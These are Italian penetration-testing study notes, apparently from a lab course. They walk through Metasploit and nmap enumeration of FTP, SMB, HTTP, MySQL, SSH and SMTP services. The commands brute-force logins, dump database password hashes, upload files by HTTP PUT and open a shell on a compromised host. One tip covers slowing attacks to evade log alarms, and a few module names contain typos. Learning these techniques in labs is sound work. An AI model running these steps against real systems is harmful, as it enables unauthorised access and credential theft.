# Enumeration

## Port scanning & enumeration con nmap + import in Metasploit

### Salvare i risultati di uno scan nmap con XML

```
nmap -Pn -sV -O <IP> -oX nome_file.xml
```

### Importare risultati Nmap in Metasploit Framework

#### Caricare file xml nel DB metasploit

1. Avviare il DB metasploit: service postgresql start
2. Entrare in metasploit: msfconsole
3. Creare un nuovo workspace: workspace -a \<nome workspace>
4. Verificare che siamo nel nuovo workspace: workspace
5. Caricare il file XML: db\_import nomefile.xml
6. Verificare che sia caricato con i comandi: hosts, services, vulns

## Avviare Metasploit (MSF)

```
service postresql start
msfconsole
db_status
workspace -a <Nome_Workspace>
setg RHOSTS <IP target>
setg RHOST <IP target>
```

### Comandi utili di Metasploit

* **workspace**: gestisce i workspace
* **setg**: setta variabili globali
* **hosts**: mostra gli host trovati
* **services**: mostra i servizi identificati tramite scan tcp o tramite moduli di enumerazione utilizzati
* **loot**: mostrare schemi dei DB scoperti
* **creds**: mostrare credenziali (username e hash) scoperte

## MSF: Port scanning con auxiliary modules

### Scan TCP

```
use auxiliary/scanner/portscan/tcp
set RHOSTS <IP target>
run
```

### Scan UDP

```
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <IP target>
run
```

## FTP Enumeration

### Modulo per verificare la versione FTP

```
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <IP>
run
```

### Modulo per bruteforce FTP login <a href="#modulo-per-bruteforce-ftp" id="modulo-per-bruteforce-ftp"></a>

Al fine di identificare username e password

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <IP>
set USER_FILE /user/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /user/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

### Modulo per connettersi ad FTP anonimamente (anonymous login) <a href="#modulo-per-connettersi-a-d-ftp-anonimamente-anonymous-login" id="modulo-per-connettersi-a-d-ftp-anonimamente-anonymous-login"></a>

```
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS <IP>
run
```

## SMB Enumeration

1. Enumerare la versione SMB
2. Enumerare gli utenti
3. Enumerare le share
4. Brute force attack per trovare le password degli utenti
5. Accesso alle share tramite le password trovate con il brute force

### SMB version

```
service postgresql start
msfconsole
workspace -a SMB_ENUM
setg RHOSTS <IP dest>
search type:auxiliary name:smb //per filtrare i risultati
use auxiliary/scanner/smb/smb_version
show options //vediamo che c'è RHOSTS è già stato impostato tramite la variabile globale
run // verifichiamo la versione di SMB
```

### Metodo alternativo usando nmap senza metasploit

Find the exact version of samba server by using appropriate nmap script.

```
nmap --script smb-os-discovery.nse -p 445 demo.ine.local
```

### SMB users enumeration

```
use auxiliary/scanner/smb/smb_enumusers
info // possiamo vedere qualche dettaglio in più sul modulo come nome, licenza, options
run
```

### SMB shares enumeration

Per enumerare tutte le cartelle share sul server SMB

```
use auxiliary/scanner/smb/smb_enumshares
show options // tra le opzioni utili al massimo c'è SMBPass e SMBUser nel caso li avessimo e poi ShowFiles per mostrare informazioni dettagliate che potrebbero tornare utili
set ShowFiles true
run
```

### Per verificare se è permesso il login anonimo

Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.

```
smbclient -L demo.ine.local -N
```

Anonymous connection is allowed since shares are displayed without requirement of password.

### SMB Login brute force module <a href="#smb-login-brute-force-module" id="smb-login-brute-force-module"></a>

```
use auxiliary/scanner/smb/smb_login
show options // in questo caso dobbiamo impostare SMBUser e PASS_FILE, poi eventualmente BRUTEFORCE_SPEED, STOP_ON_SUCCESS e il numero di THREADS
set SMBUser admin
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### Accesso alle share e file con utility SMBclient (fuori da Metasploit)

```
smbclient -L \\\\192.91.46.3\\ -U admin
```

#### Accesso alla singola share

```
smbclient \\\\<IP>\\public -U admin
```

## Web Server Enumeration

### Avvio Metasploit Framework (MSF)

Primi passi per avviare metsploit e configurarlo brevemente per questa sessione:

```
service postgresql start
msfconsole
workspace -a Web_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:http
```

### HTTP version enumeration

```
use auxiliary/scanner/http/http_version
// se è HTTPS imposta la variabile SSL a true: set SSL true
run
```

Ci viene restituita la versione del web server e il sistema operativo

### Analizzare il robots.txt

robots.txt elenca le pagine che non devono essere indicizzate nei search engine

```
use auxiliary/scanner/http/robots_txt
run
```

### Directory bruteforce/listing/enumeration

Si fa bruteforce di un webserver cercando tutte le directory con un dizionario per identificare quali directory sono presenti nel webserver, anche quelle che normalmente non sono accessibili via link nelle pagine.

```
use auxiliary/scanner/http/dir_scanner
show options  //nella variabile DICTIONARY c'è il file che contiene le parole usate come directory
// se vogliamo possiamo eseguire: set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### File bruteforcing/listing/enumeration

Facciamo un bruteforce per trovare dei file, invece che directory come fatto prima.

```
use auxiliary/scanner/http/files_dir
show options //si può modificare il DICTIONARY, EXTensions dei file e il PATH
run
```

In questo caso viene impostato come dictionary un file di wmap, che è un modulo per metasploit framework usato per fare vulnerability scanning per webapplication.

### Bruteforce login per pagine HTTP

Usiamo un modulo che ci consente di fare bruteforce su un authentication form

```
use auxiliary/scanner/http/http_login
set AUTH_URI /secure/    //dove secure è <pagina con autenticazione>
unset USERPASS_FILE    // meglio non farlo perché a me senza non ha funzionato nel lab
run
```

I parametri che andiamo a modificare sono: AUTH\_URI che è il path della directory che richiede il form di autenticazione, e andiamo a rimuovere l'impostazione di default a USERPASS\_FILE perché utilizzeremo i già impostati PASS\_FILE e USER\_FILE.

Si può provare anche cambiando le wordlists:

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false  //cambiamo anche il VERBOSE per evitare che ci faccia vedere tutti i tentativi
run
```

### Determinare gli utenti esistenti tramite Apache

Modulo che utilizza il UserDir directive presente in Apache per determinare quali utenti esistono e quali no

```
use auxiliary/scanner/http/apache_userdir_enum
info
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

Abbiamo trovato così qualche utente del webserver, e possiamo usare questa informazione inserendola come utente nel bruteforce del login.

### Bruteforce login per pagine HTTP con un utente già identificato

Esempio con l'utente rooty trovato con il modulo sopra

```
use auxiliary/scanner/http/http_login
echo "rooty" > user.txt
set USER_FILE /root/user.txt
run
```

### Effettuare un upload di un file sul webserver <a href="#effettuare-un-upload-di-un-file-sul-webserver" id="effettuare-un-upload-di-un-file-sul-webserver"></a>

```
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run
```

#### Cancellare il file caricato

```
use auxiliary/scanner/http/http_put
set RHOSTS victim-1
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run
```

## MySQL Enumeration

### Avvio Metasploit Framework (MSF)

Primi passi per avviare metsploit e configurarlo brevemente per questa sessione:

```
service postgresql start
msfconsole
workspace -a MySQL_ENUM
setg RHOSTS <IP dest>
setg RHOST <IP dest>
search type:auxiliary name:mysql
```

### MySQL version enumeration

```
use auxiliary/scanner/mysql/mysql_version
```

### MySQL Login brute force attack

Per trovare gli utenti e accedere al DB possiamo o sfruttare delle vulnerabilità per la versione di SQL, ma in questo caso non è vulnerabile, oppure usiamo il modulo mysql\_login che permette di fare un brute force (dictionary attack) per trovare utenti e password del DB.

```
use auxiliary/scanner/myssql/mysql_login
set username root //per provare a trovare la password per l'utente root direttamente
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

### MySQL Enumeration utenti come utente loggato

Enumeration loggandoci con l'utente admin scoperto tramite brute force

```
use auxiliary/admin/mysql/mysql_enum
set PASSWORD twinkle
set USERNAME root
run
```

Ci fornisce una lista degli account e l'hash delle loro password, e i permessi dei vari account

### Modulo per eseguire query SQL

```
use auxiliary/admin/mysql/mysql_sql
set PASSWORD twinkle
set USERNAME root
set SQL //dobbiamo impostare la query SQL da eseguire, di default è select version() per vedere la versione
run
```

Se abbiamo accesso admin al DB possiamo eseguire la query per vedere i DB (o le tabelle di uno schema):

```
set SQL show databases;
run
```

### Enumerare tutti gli schema e tabelle nel DB

```
use auxiliary/scanner/mysql/mysql_schemadump
set PASSWORD twinkle
set USERNAME root
run
```

### Fare il dump di tutti gli hash degli utenti del DB

```
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS <IP target>
run
```

### Identificare le cartelle scrivibili tramite MySQL

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS <IP target>
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### Tip: Connessione diretta al DB (al di fuori di MSF)

```
mysql -h <IP target> -u <username> -p
// ora che siamo connessi dentro al DB possiamo fare tutte le query che vogliamo.
```

## SSH Enumeration

### Avvio Metasploit framework

```
service postgresql start
msfconsole
workspace -a SSH_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:ssh
```

### SSH version enumeration

```
use auxiliary/scanner/ssh/ssh_version
run
```

### SSH users enumeration

```
use auxiliary/scanner/ssh/ssh_enumusers
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
run
```

### SSH bruteforce delle credenziali

```
use auxiliary/scanner/ssh/ssh_version  // se il target usa l'autenticazione via user e password
use auxiliary/scanner/ssh/ssh_login    // se il target usa l'autenticazione con chiave public/private
show options
// meglio ridurre la BRUTEFORCE_SPEED perché i log di solito vengono inviati a un Sys Log Server e quindi potrebbe scattare qualche allarme
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt //oppure unix_passwords.txt
run
// terminiamo la sessione aperta automaticamente con CTRL+C
sessions
session 1
/bin/bash -i   // per aprire una shell interattiva nella sessione 1
```

Questo modulo apre in automatico anche un terminale con SSH sul target, però in realtà se proviamo a scrivere qualche comando non funziona, quindi bisogna terminarlo con CTRL+C e poi se scriviamo il comando sessions possiamo vedere che ne ha attivata una in automatico al posto nostro.

Però se poi entriamo nella sessione attiva e scriviamo ls non vediamo il risultato, allora dobbiamo aprire una shell interattiva con il comando _/bin/bash -i_

## SMTP Enumeration

Con SMTP possiamo trovare un elenco degli utenti presenti sul sistema, e di conseguenza possiamo usare questi utenti per fare dei brute force su SSH o altri protocolli.

### Avvio Metasploit Framework

```
service postgresql start
msfconsole
workspace -a SMTP_Enum
setg RHOSTS <IP target>
setg RHOST <IP target>
search type:auxiliary name:smtp
```

### SMTP version enumeration

```
use auxiliary/scanner/smtp/smtp_version
run
```

### SMTP user enumeration

```
use auxiliary/scanner/smtp/smtp_enum     // user enumeration
run
```

UNIXONLY è true perché sappiamo che è un sistema linux, stesso motivo per cui lo USER\_FILE è la default unix\_users.txt
